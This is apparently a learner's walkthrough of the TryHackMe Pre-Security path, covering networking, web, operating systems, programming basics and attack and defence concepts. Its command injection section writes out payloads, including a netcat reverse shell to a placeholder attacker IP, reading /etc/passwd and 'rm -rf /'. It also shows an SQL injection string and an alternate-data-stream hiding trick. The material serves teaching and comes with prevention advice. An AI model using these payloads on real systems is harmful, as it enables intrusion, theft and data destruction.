# TryHackMe Pre-Security Path — Comprehensive Walkthrough

- **Path:** Pre-Security
- **Difficulty:** Beginner (No prior knowledge required)
- **Estimated Completion Time:** 10–15 hours
- **Certificate:** SEC0 Professional Certification
- **Status:** ✅ 100% Complete
- **Profile:** [utkarsshh](https://tryhackme.com/p/utkarsshh)

---

## Table of Contents

1. [Introduction to Cyber Security](#1-introduction-to-cyber-security)
2. [Network Fundamentals](#2-network-fundamentals)
3. [How The Web Works](#3-how-the-web-works)
4. [Computer Fundamentals](#4-computer-fundamentals)
5. [Operating Systems Basics](#5-operating-systems-basics)
6. [Software Basics](#6-software-basics)
7. [Attacks and Defenses](#7-attacks-and-defenses)
8. [Final Thoughts](#8-final-thoughts)

---

## 1. Introduction to Cyber Security

### Overview

This module establishes the foundational mindset for cybersecurity by distinguishing between the two primary disciplines: offensive and defensive security. It also introduces the career landscape within the industry.

### Offensive Security vs. Defensive Security

| Aspect | Offensive Security | Defensive Security |
|--------|--------------------|--------------------|
| **Goal** | Identify and exploit vulnerabilities before malicious actors do | Detect, prevent, and respond to threats in real time |
| **Roles** | Penetration Tester, Red Teamer, Bug Bounty Hunter | SOC Analyst, Incident Responder, Forensic Analyst |
| **Activities** | Vulnerability assessment, exploitation, privilege escalation | Log monitoring, threat hunting, containment and eradication |
| **Mindset** | "How can I break this?" | "How can I protect this?" |

### Career Pathways in Cyber

The module surveys the breadth of cybersecurity career opportunities:

- **Security Analyst:** Monitors networks, triages alerts, coordinates incident response.
- **Penetration Tester:** Conducts authorised assessments to uncover security weaknesses.
- **SOC Analyst:** Operates within a Security Operations Centre, leveraging SIEM platforms such as Splunk or Elastic to detect anomalies.
- **Security Engineer:** Architects and maintains security infrastructure (firewalls, IDS/IPS, endpoint protection).
- **Forensic Analyst:** Investigates breaches, recovers evidence, and reconstructs attack chains.
- **Malware Analyst:** Reverse-engineers malicious software to understand its behaviour and develop signatures.
- **GRC Analyst:** Ensures compliance with regulatory frameworks (ISO 27001, NIST, GDPR).
- **CISO:** Executive leadership responsible for an organisation's security posture.

**Key Insight:** Entry-level hiring prioritises practical, hands-on experience over certifications. Building a home lab, participating in CTF competitions, and documenting findings through write-ups are among the most effective ways to demonstrate competence.

---

## 2. Network Fundamentals

### Overview

Networking is the backbone of all modern computing. This module builds an understanding of how devices communicate across local and wide-area networks, the protocols that govern this communication, and the common vulnerabilities that arise from misconfigured network services.

### The OSI and TCP/IP Models

| OSI Layer | Function | TCP/IP Layer | Example Protocols |
|-----------|----------|--------------|-------------------|
| 7 — Application | User-facing services | Application | HTTP, FTP, SMTP, DNS |
| 6 — Presentation | Data translation, encryption | Application | TLS, SSL |
| 5 — Session | Session management | Application | NetBIOS, RPC |
| 4 — Transport | End-to-end reliability | Transport | TCP, UDP |
| 3 — Network | Logical addressing, routing | Internet | IP, ICMP, ARP |
| 2 — Data Link | Framing, MAC addressing | Network Interface | Ethernet, Wi-Fi (802.11) |
| 1 — Physical | Raw bit transmission | Network Interface | Cables, radio frequencies |

**Practical Application:** When you visit a website, your request traverses down the OSI stack on your machine, across the network, and back up the stack on the server. Each layer adds headers and encapsulates data from the layer above — a concept known as encapsulation.

### IP Addressing and Subnetting

- **IPv4:** 32-bit address space (e.g., `192.168.1.1`), approximately 4.3 billion addresses. Depletion led to NAT and CIDR.
- **IPv6:** 128-bit address space (e.g., `2001:db8::1`), designed to replace IPv4.
- **Subnetting:** Dividing a network into smaller segments using a subnet mask. Example: `192.168.1.0/24` yields 256 addresses (254 usable).

### Core Protocols

| Protocol | Transport | Function |
|----------|-----------|----------|
| TCP | Connection-oriented | Reliable, ordered delivery with error checking |
| UDP | Connectionless | Fast, lightweight — suitable for streaming, DNS, VoIP |
| ICMP | N/A (operates on top of IP) | Diagnostic messaging — used by `ping` and `traceroute` |
| ARP | N/A (within Link Layer) | Resolves IP addresses to MAC addresses on a LAN |

### Common Ports and Services

| Port | Protocol | Service |
|------|----------|---------|
| 21 | TCP | FTP (File Transfer Protocol) |
| 22 | TCP | SSH (Secure Shell) |
| 23 | TCP | Telnet (unencrypted remote access) |
| 25 | TCP | SMTP (email delivery) |
| 53 | TCP/UDP | DNS (Domain Name System) |
| 80 | TCP | HTTP |
| 443 | TCP | HTTPS |
| 3389 | TCP | RDP (Remote Desktop Protocol) |

### Practical Commands

```bash
ip a                         # Display all network interfaces and their IPs
ping -c 4 8.8.8.8            # Send 4 ICMP echo requests
traceroute google.com        # Trace the route packets take to a destination
netstat -tulpn               # List all listening TCP/UDP ports with processes
ss -tulpn                    # Modern alternative to netstat
nmap -sV -p- 192.168.1.1     # Scan all ports with version detection
```

### Security Implications

Understanding network fundamentals is critical for:

- **Reconnaissance:** Identifying live hosts, open ports, and running services.
- **Exploitation:** Targeting vulnerable services exposed to the network.
- **Defence:** Segmenting networks, configuring firewalls, and monitoring for anomalous traffic patterns.

---

## 3. How The Web Works

### Overview

The web is the primary attack surface in modern cybersecurity. This module dissects the full stack of web technology — from DNS resolution and HTTP protocol mechanics to the client-side technologies that render content in the browser.

### How Websites Work

Websites are built on three core technologies:

1. **HTML (HyperText Markup Language):** Defines the structure of a webpage. Elements include headings, paragraphs, forms, links, and comments.
2. **CSS (Cascading Style Sheets):** Controls visual presentation — colours, layout, typography.
3. **JavaScript:** Enables dynamic, client-side behaviour — DOM manipulation, event handling, AJAX requests.

**Security Considerations:**
- HTML comments may inadvertently expose sensitive information (credentials, API endpoints).
- Client-side JavaScript cannot be trusted for authentication or access control — anything in the browser is visible to the user.
- Input fields without proper sanitisation are vulnerable to HTML injection and cross-site scripting (XSS).

**Practical Exercise:** Using browser DevTools (F12), inspect the Elements panel to view hidden comments and the Sources panel to examine JavaScript files for hardcoded secrets.

### DNS in Detail

The Domain Name System translates human-readable domain names (e.g., `tryhackme.com`) into machine-readable IP addresses.

**DNS Hierarchy:**

```
Root (.)
  └── Top-Level Domain (.com, .org, .uk)
       └── Second-Level Domain (tryhackme)
            └── Subdomain (www, admin, mail)
```

**Record Types:**

| Record | Purpose |
|--------|---------|
| A | Maps a domain to an IPv4 address |
| AAAA | Maps a domain to an IPv6 address |
| CNAME | Canonical name — aliases one domain to another |
| MX | Mail exchange — directs email to mail servers |
| TXT | Arbitrary text — used for SPF, DKIM, domain verification |
| NS | Delegates a domain to a nameserver |

**Resolution Flow:**

1. Client queries a recursive resolver (e.g., `8.8.8.8`).
2. Recursive resolver queries the root nameserver.
3. Root responds with the TLD nameserver (e.g., `.com`).
4. Resolver queries the TLD nameserver for the authoritative nameserver.
5. Authoritative nameserver responds with the A/AAAA record.

**Practical Commands:**

```bash
nslookup tryhackme.com
nslookup -type=MX tryhackme.com
dig tryhackme.com A +short
dig +trace tryhackme.com
host tryhackme.com
```

**Attack Vectors:**
- DNS spoofing / cache poisoning: Injecting fraudulent DNS records.
- DNS tunnelling: Exfiltrating data encoded in DNS queries.
- Subdomain takeover: Claiming an orphaned DNS record pointing to a decommissioned service.

### HTTP in Detail

HTTP (HyperText Transfer Protocol) is the foundation of data communication on the web. HTTPS adds TLS encryption on top.

**Request Methods:**

| Method | Purpose | Idempotent | Safe |
|--------|---------|------------|------|
| GET | Retrieve a resource | Yes | Yes |
| POST | Submit data to be processed | No | No |
| PUT | Replace a resource | Yes | No |
| PATCH | Partially update a resource | No | No |
| DELETE | Remove a resource | Yes | No |

**Status Codes:**

| Range | Category | Examples |
|-------|----------|---------|
| 1xx | Informational | 101 — Switching Protocols (WebSocket upgrade) |
| 2xx | Success | 200 OK, 201 Created, 204 No Content |
| 3xx | Redirection | 301 Moved Permanently, 302 Found, 304 Not Modified |
| 4xx | Client Error | 400 Bad Request, 401 Unauthorised, 403 Forbidden, 404 Not Found |
| 5xx | Server Error | 500 Internal Server Error, 502 Bad Gateway, 503 Service Unavailable |

**Key Headers:**

| Header | Request/Response | Purpose |
|--------|-----------------|---------|
| `Host` | Request | Specifies target domain (virtual hosting) |
| `User-Agent` | Request | Identifies the client (browser, tool) |
| `Authorization` | Request | Carries credentials (Basic, Bearer token) |
| `Cookie` | Request | Sends stored session tokens |
| `Set-Cookie` | Response | Instructs the client to store a cookie |
| `Content-Type` | Both | Specifies the MIME type of the body |
| `Location` | Response | Used with 3xx to indicate the redirect target |

**Practical Commands:**

```bash
# Basic GET request with verbose output
curl -v https://tryhackme.com

# POST request with form data
curl -X POST -d "username=admin&password=pass" http://example.com/login

# Custom User-Agent header
curl -A "Mozilla/5.0 (X11; Linux x86_64)" http://example.com

# Send cookies
curl -b "session=eyJhbGciOiJIUzI1NiJ9" http://example.com/dashboard

# Follow redirects
curl -L http://example.com

# View only response headers
curl -I https://tryhackme.com
```

### Putting It All Together — The Full Request Lifecycle

1. **URL entry:** User types `https://tryhackme.com` into the browser.
2. **DNS resolution:** Browser checks its cache, then queries the OS resolver, which contacts the configured DNS server.
3. **TCP handshake:** Three-way handshake (SYN → SYN-ACK → ACK) establishes a connection.
4. **TLS handshake:** If HTTPS, certificate exchange and cipher suite negotiation occur.
5. **HTTP request:** Browser assembles a GET request with headers (Host, User-Agent, Accept, Cookie, etc.) and sends it over the encrypted connection.
6. **Server processing:** Web server interprets the request, executes backend logic (database queries, authentication checks), and generates a response.
7. **HTTP response:** Server returns a status code, headers, and the response body (HTML, JSON, images).
8. **Rendering:** Browser parses HTML, fetches additional resources (CSS, JS, images) via more HTTP requests, and renders the page.
9. **Connection persistence:** The connection may be kept alive for subsequent requests (HTTP/1.1 Keep-Alive) or multiplexed (HTTP/2).

---

## 4. Computer Fundamentals

### Overview

Before you can secure technology, you must understand how it works. This module explores the physical and logical components that constitute a computer system, from transistors to cloud infrastructure.

### Internal Hardware Architecture

**Central Processing Unit (CPU)**

The CPU is the brain of the computer. Key attributes:

- **Cores:** Independent processing units. Modern CPUs range from 2 to 64+ cores.
- **Clock Speed:** Measured in GHz — the number of cycles per second.
- **Cache:** Small, fast memory (L1, L2, L3) that stores frequently accessed data.
- **Instruction Set:** x86, x86-64 (Intel/AMD), ARM (mobile/embedded).
- **Pipelining & Superscalar Execution:** Execute multiple instructions per cycle.

**Random Access Memory (RAM)**

Volatile memory that stores data currently in use:

- **DDR Generations:** DDR3, DDR4, DDR5 — each doubling throughput.
- **Capacity:** 4 GB to 128+ GB.
- **Speed:** Measured in MT/s (megatransfers per second).
- **Virtual Memory:** The OS can use disk space as an extension of RAM (swap/paging).

**Storage**

| Type | Technology | Speed | Durability | Use Case |
|------|------------|-------|------------|----------|
| HDD | Magnetic platters | 80–160 MB/s | Mechanical (fragile) | Bulk storage, backups |
| SATA SSD | NAND flash | 500–600 MB/s | No moving parts | General-purpose OS/apps |
| NVMe SSD | NAND flash over PCIe | 3,000–7,000 MB/s | No moving parts | High-performance, databases |
| eMMC | Embedded flash | 200–400 MB/s | Soldered | Budget laptops, tablets |

**Motherboard**

The main circuit board interconnects all components via buses:

- **PCIe:** Connects GPU, NVMe drives, network cards (x1, x4, x8, x16 lanes).
- **SATA:** Connects HDDs and SATA SSDs.
- **USB:** Peripheral connectivity (2.0, 3.0, 3.1, 3.2, 4.0).
- **Chipset:** Manages data flow between CPU, memory, and peripherals.

**Graphics Processing Unit (GPU)**

Originally designed for rendering graphics, GPUs excel at parallel computation. Modern GPUs (NVIDIA CUDA, AMD ROCm) are used for:

- 3D rendering and gaming
- Machine learning training and inference
- Cryptocurrency mining (historically)
- Scientific simulations

### Types of Computer Systems

| Category | Characteristics | Examples |
|----------|----------------|----------|
| **Desktop** | Modular, upgradeable, high performance | Gaming PC, workstation |
| **Laptop** | Portable, integrated display and battery | Ultrabook, gaming laptop |
| **Server** | Rack-mounted, ECC memory, redundant PSU, remote management (IPMI/iDRAC) | Dell PowerEdge, HPE ProLiant |
| **Workstation** | High-core CPU, professional GPU (NVIDIA Quadro/RTX), large ECC RAM | Dell Precision, HP Z-series |
| **Embedded System** | Purpose-built, real-time constraints, low power | Raspberry Pi, Arduino, ESP32 |
| **Microcontroller** | Single-chip computer with CPU, RAM, flash, I/O on one die | ATmega328P, STM32 |
| **Smartphone** | ARM SoC, integrated modem, sensors, power-optimised | iPhone, Samsung Galaxy |
| **Mainframe** | Enterprise-scale transaction processing, redundant everything | IBM zSeries |
| **Supercomputer** | Thousands of CPUs/GPUs, high-speed interconnects (InfiniBand) | Fugaku, Summit, Frontier |

### Cloud Computing

The module introduces cloud computing as an extension of traditional computer systems:

- **IaaS (Infrastructure as a Service):** Virtual machines, storage, networking (AWS EC2, Azure VM).
- **PaaS (Platform as a Service):** Managed application hosting (Heroku, Google App Engine).
- **SaaS (Software as a Service):** End-user applications (Google Workspace, Microsoft 365).
- **Deployment Models:** Public, private, hybrid, multi-cloud.

**Security Implications:**
- Misconfigured S3 buckets and storage containers are a leading cause of data breaches.
- Cloud IAM (Identity and Access Management) is critical — least privilege should be enforced across all resources.
- Shared responsibility model: the provider secures the infrastructure; the customer secures their data and configuration.

---

## 5. Operating Systems Basics

### Overview

An operating system (OS) manages hardware resources, provides services to applications, and mediates user interaction. This module covers the two dominant OS families: Windows and Linux.

### What is an Operating System?

An OS is system software that:

- Manages CPU scheduling, memory allocation, and I/O operations.
- Provides a file system for persistent data storage.
- Enforces security through user accounts, permissions, and access controls.
- Exposes an interface — either graphical (GUI) or command-line (CLI).

### Operating System Components

| Component | Function |
|-----------|----------|
| **Kernel** | Core of the OS — manages processes, memory, devices. Monolithic (Linux) or microkernel (Minix). |
| **Process Scheduler** | Determines which process runs at any given time. Scheduling algorithms: round-robin, priority-based, multi-level feedback queue. |
| **Memory Manager** | Handles virtual-to-physical address translation, paging, segmentation, and swap. |
| **File System** | Organises data on disk. Journaling (ext4, NTFS) prevents corruption on crashes. |
| **Device Drivers** | Enable the OS to communicate with hardware. |
| **System Libraries** | Provide a standard API for application development (glibc, Win32 API). |
| **Shell / UI** | User interface — CLI (bash, PowerShell) or GUI (GNOME, Windows Explorer). |

### Process Lifecycle

```
New → Ready → Running → Waiting → Terminated
              ↑                    ↓
              └─── Ready (resumed) ←── Interrupt/I/O complete
```

- **Context Switching:** The kernel saves and restores process states to enable multitasking.
- **Inter-Process Communication (IPC):** Pipes, sockets, shared memory, message queues.

### Linux Fundamentals

**File System Hierarchy:**

| Path | Purpose |
|------|---------|
| `/bin` | Essential user binaries (ls, cat, cp) |
| `/sbin` | System binaries (fdisk, iptables) |
| `/etc` | Configuration files |
| `/home` | User home directories |
| `/var` | Variable data — logs, databases |
| `/tmp` | Temporary files (cleared on reboot) |
| `/dev` | Device files (disks, terminals) |
| `/proc` | Virtual filesystem for process information |

**Permission Model:**

```
-rwxr-xr--  1 user group  4096 Jun 26 10:00 script.sh
 ^^^^^^^                   ^
  |  |  └── Others (read)
  |  └───── Group (read, execute)
  └──────── User (read, write, execute)
```

Permissions are also expressed numerically: `rwx` = 4+2+1 = 7.

**Essential Commands:**

```bash
# File operations
touch file.txt                  # Create empty file
cp source.txt dest.txt          # Copy
mv old.txt new.txt              # Move/rename
rm -rf directory/               # Recursively delete

# Permissions
chmod 755 script.sh             # Set rwxr-xr-x
chown user:group file.txt       # Change owner

# Process management
ps aux                          # List all processes
top / htop                      # Interactive process viewer
kill -9 PID                     # Force kill a process

# Text processing
grep -r "pattern" /path/        # Recursive search
find /home -name "*.txt"        # Find files by name
sed 's/old/new/g' file.txt      # Find and replace
awk '{print $1}' file.txt       # Extract first column
```

### Windows Fundamentals

**NTFS (New Technology File System):**

- **Permissions:** Full Control, Modify, Read & Execute, List, Read, Write — assignable per user/group.
- **Alternate Data Streams (ADS):** Hidden data attached to a file. `type payload.exe > legit.txt:hidden.exe`. Can hide malware.
- **Compression & Encryption:** Transparent file-level compression and EFS (Encrypting File System).

**User Account Control (UAC):**

UAC prompts for administrator consent or credentials before making system-level changes. It runs standard users with reduced privileges and elevates only approved processes. This prevents malware from silently installing itself.

**Key Administrative Tools:**

- **Task Manager** (`taskmgr`): View processes, performance metrics, startup programs, services.
- **Event Viewer** (`eventvwr`): Analyse system, security, and application logs.
- **Services** (`services.msc`): Start, stop, and configure Windows services.
- **Local Security Policy** (`secpol.msc`): Configure audit policies, user rights, and security options.
- **Registry Editor** (`regedit`): Hierarchical database of system and application settings.

**Command-Line Utilities:**

```cmd
ipconfig /all                # View network configuration
systeminfo                   # Detailed system information
netstat -anb                 # Active connections with process names
tasklist /v                  # Running processes with details
wmic os get Caption,Version  # OS version info (legacy)
```

---

## 6. Software Basics

### Overview

This module bridges the gap between hardware and application software by introducing how computers represent and manipulate data, how programs are structured, and the basics of three widely used programming languages.

### How Computers Handle Data

**Binary Representation:**

Computers operate on binary — two states (`0` and `1`) represented by electrical voltage levels. Groupings:

- **Bit (b):** Single binary digit.
- **Byte (B):** 8 bits — enough to store one ASCII character.
- **Kilobyte (KB):** 1,024 bytes.
- **Megabyte (MB):** 1,024 KB ≈ 1 million bytes.
- **Gigabyte (GB):** 1,024 MB ≈ 1 billion bytes.

**Number Systems:**

| System | Base | Digits | Example |
|--------|------|--------|---------|
| Binary | 2 | 0,1 | `1010` = decimal 10 |
| Octal | 8 | 0–7 | `12` = decimal 10 |
| Decimal | 10 | 0–9 | `10` |
| Hexadecimal | 16 | 0–9, A–F | `0xA` = decimal 10 |

**Character Encoding:**

- **ASCII:** 7-bit encoding (128 characters). Includes letters, digits, punctuation, control codes.
- **Unicode (UTF-8):** Variable-length encoding supporting all world scripts. Backwards-compatible with ASCII.

### Introduction to Programming

**Core Concepts:**

- **Variables:** Named storage for data.
- **Data Types:** Integers, floats, strings, booleans, arrays, objects.
- **Control Flow:** Conditional statements (`if`/`else`), loops (`for`, `while`).
- **Functions:** Reusable blocks of code that accept parameters and return values.
- **Data Structures:** Arrays/lists, dictionaries/objects, sets, stacks, queues.

**Common Paradigms:**

| Paradigm | Description | Languages |
|----------|-------------|-----------|
| Imperative | Step-by-step instructions | C, Python |
| Object-Oriented | Organised around objects (data + behaviour) | Python, Java, C++ |
| Functional | Emphasises pure functions and immutability | Haskell, Elixir |
| Event-Driven | Responds to events/triggers | JavaScript, C# |

### Python Basics

```python
# Variables and types
name = "Alice"
age = 25
is_student = True

# Conditional
if age >= 18:
    print(f"{name} is an adult.")

# Loop
for i in range(5):
    print(i)

# Function
def greet(name):
    return f"Hello, {name}!"

# List comprehension
squares = [x**2 for x in range(10)]

# File I/O
with open("data.txt", "r") as f:
    content = f.read()
```

### JavaScript Basics

```javascript
// Variables
let name = "Alice";
const age = 25;

// Arrow function
const greet = (name) => `Hello, ${name}!`;

// DOM manipulation
document.getElementById("btn").addEventListener("click", () => {
    alert("Button clicked!");
});

// Asynchronous (Promise)
fetch("/api/data")
    .then(response => response.json())
    .then(data => console.log(data));

// Object
const user = { name: "Alice", age: 25 };
```

### SQL Basics

SQL (Structured Query Language) manages relational databases:

```sql
-- Query data
SELECT username, email FROM users WHERE active = 1;

-- Insert data
INSERT INTO users (username, email) VALUES ('alice', 'alice@example.com');

-- Update data
UPDATE users SET active = 0 WHERE last_login < '2025-01-01';

-- Delete data
DELETE FROM users WHERE username = 'bob';

-- Joins
SELECT orders.id, users.username
FROM orders
INNER JOIN users ON orders.user_id = users.id;

-- Aggregation
SELECT status, COUNT(*) FROM orders GROUP BY status;
```

**SQL Injection (Security Focus):**

Untrusted input concatenated into SQL queries can lead to data exfiltration or destruction:

```sql
-- Vulnerable query
"SELECT * FROM users WHERE username = '" + user_input + "'"

-- Attacker input: ' OR '1'='1
-- Result: SELECT * FROM users WHERE username = '' OR '1'='1'  (returns ALL rows)
```

Defence: Always use parameterised queries or prepared statements.

---

## 7. Attacks and Defenses

### Overview

This module synthesises everything learned into practical scenarios. It examines how attackers think, the methodologies they employ, and how defenders can detect, respond to, and prevent these techniques.

### The Cyber Kill Chain (Lockheed Martin)

A seven-stage model describing the progression of a cyber attack:

| Stage | Description | Example |
|-------|-------------|---------|
| 1. Reconnaissance | Gather information about the target | OSINT, port scanning, social media profiling |
| 2. Weaponisation | Pair exploit with delivery mechanism | Crafting a malicious PDF with an embedded payload |
| 3. Delivery | Transmit the weapon to the target | Phishing email, USB drop, drive-by download |
| 4. Exploitation | Trigger the exploit | Buffer overflow, command injection, XSS |
| 5. Installation | Establish persistence | Installing a backdoor, creating scheduled tasks |
| 6. Command & Control (C2) | Establish remote control channel | Reverse shell over HTTPS, DNS tunnelling |
| 7. Actions on Objectives | Achieve the attacker's goal | Data exfiltration, ransomware deployment, lateral movement |

### MITRE ATT&CK Framework

A comprehensive knowledge base of adversary tactics and techniques:

- **Tactics:** The "why" — 14 categories including Initial Access, Persistence, Privilege Escalation, Defence Evasion, Credential Access, Discovery, Lateral Movement, Collection, Exfiltration, Command and Control.
- **Techniques:** The "how" — over 200 specific techniques (e.g., T1566 — Phishing, T1059 — Command and Scripting Interpreter).
- **Sub-Techniques:** Granular variants (e.g., T1566.001 — Spearphishing Attachment).
- **Mitigations:** Recommended security controls to prevent or detect each technique.

### Offensive Security in Practice

**Command Injection — Practical Walkthrough:**

The Offensive Security Intro room presents a web application with a ping form. The form takes an IP address and passes it unsanitised to the system shell:

```php
// Vulnerable PHP code
$ip = $_POST['ip'];
system("ping -c 4 " . $ip);
```

Since user input is concatenated directly into a shell command, an attacker can inject additional commands:

```
127.0.0.1 && cat /etc/passwd
127.0.0.1; whoami
127.0.0.1 | nc ATTACKER_IP 4444 -e /bin/bash
```

**Prevention:**
- Never pass user input directly to system commands.
- Use language-specific libraries that handle shell execution safely.
- Implement strict input validation (whitelist IP addresses only).
- Apply the principle of least privilege to the web server process.

**Command Injection vs. Code Injection:**

| Type | Description | Example |
|------|-------------|---------|
| OS Command Injection | Injecting OS commands into a shell | `; rm -rf /` |
| Code Injection | Injecting code into an application | `eval("user_input")` in PHP/Python |

### Defensive Security in Practice

**Incident Response Walkthrough (FakeBank Scenario):**

The Defensive Security Intro room simulates a real-time attack on a financial institution (FakeBank). The defender's objective is to detect, analyse, and contain the breach.

**Phase 1 — Detection:**
- SIEM alerts triggered by unusual outbound traffic to a foreign IP.
- Endpoint detection flags a suspicious PowerShell execution.

**Phase 2 — Analysis:**
- Packet capture (PCAP) analysis reveals beaconing traffic every 60 seconds to `185.xxx.xxx.xxx:4443`.
- Process tree analysis shows `powershell.exe` spawned by `winword.exe` — indicative of a macro-based initial access.
- Registry autorun entries show persistence via `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`.

**Phase 3 — Containment:**
- Isolate the affected host from the network.
- Block the C2 IP at the firewall.
- Disable the compromised user account.

**Phase 4 — Eradication:**
- Remove the persistence mechanism.
- Wipe and reimage the affected host.
- Rotate credentials that may have been compromised.

**Phase 5 — Recovery:**
- Restore from known-good backup.
- Monitor for re-infection.

**Phase 6 — Lessons Learned:**
- Implement macro security policies (block macros from the internet).
- Deploy endpoint detection and response (EDR) agents.
- Conduct user awareness training on phishing.

### Key Security Controls

| Control | Purpose | Examples |
|---------|---------|----------|
| **Firewall** | Network traffic filtering | iptables, pfSense, AWS Security Groups |
| **IDS/IPS** | Detect/prevent malicious traffic | Snort, Suricata |
| **SIEM** | Centralised log aggregation and alerting | Splunk, Elastic Stack, Azure Sentinel |
| **EDR** | Endpoint visibility and threat hunting | Crowdstrike, SentinelOne, Defender for Endpoint |
| **AV / Antimalware** | Signature and heuristic detection | ClamAV, Windows Defender |
| **MFA** | Multi-factor authentication | TOTP, WebAuthn, SMS codes |
| **DLP** | Data Loss Prevention — prevent exfiltration | Microsoft Purview, Symantec DLP |
| **WAF** | Web Application Firewall | ModSecurity, Cloudflare WAF, AWS WAF |

### The Defensive Mindset

- **Assume breach:** Architect systems with the expectation that an attacker will eventually compromise some component.
- **Defence in depth:** Layer multiple, independent security controls.
- **Least privilege:** Grant only the minimum permissions necessary for a user or process to function.
- **Segmentation:** Isolate critical systems from general-purpose networks.
- **Visibility:** You cannot defend what you cannot see — invest in logging, monitoring, and telemetry.
- **Continuous improvement:** Security is not a one-time project; it requires ongoing assessment, testing, and refinement.

---

## 8. Final Thoughts

The Pre-Security path delivers on its promise: it takes someone with zero technical background and equips them with a solid, practical understanding of how modern technology works and how it can be attacked and defended.

### What I Found Most Valuable

1. **Hands-on immediacy:** Every module includes an interactive terminal or browser-based exercise. You are not just reading — you are doing.
2. **Breadth before depth:** The path intentionally covers a wide surface area — networking, the web, operating systems, programming — before diving into security. This provides essential context for later, more specialised study.
3. **Offensive + Defensive balance:** Understanding both sides of the fence is critical. The path introduces command injection and network scanning alongside incident response and SOC operations.

### Next Steps

With Pre-Security completed, the logical progression paths are:

| Path | Focus | Recommended For |
|------|-------|-----------------|
| **SOC Level 1** | Defensive security, SIEM, incident response | Aspiring SOC analysts |
| **Jr Penetration Tester** | Offensive security, web exploitation, privilege escalation | Aspiring pentesters |
| **Cyber Defence** | Blue team operations, threat hunting, digital forensics | Defence-oriented learners |

### Resources for Continued Learning

- **Books:** *The Web Application Hacker's Handbook* (Stuttard), *Practical Malware Analysis* (Sikorski), *Blue Team Field Manual* (Murdoch).
- **Labs:** Hack The Box, PortSwigger Web Security Academy, PentesterLab, PicoCTF.
- **Communities:** TryHackMe Discord, r/netsec, r/cybersecurity, OWASP chapter meetups.

---

*Path completed: June 2026*  
*TryHackMe Profile: [utkarsshh](https://tryhackme.com/p/utkarsshh)*  
*Certificate: [pre_security.pdf](./pre_security.pdf)*  
*SEC0 Professional Certification: Unlocked*
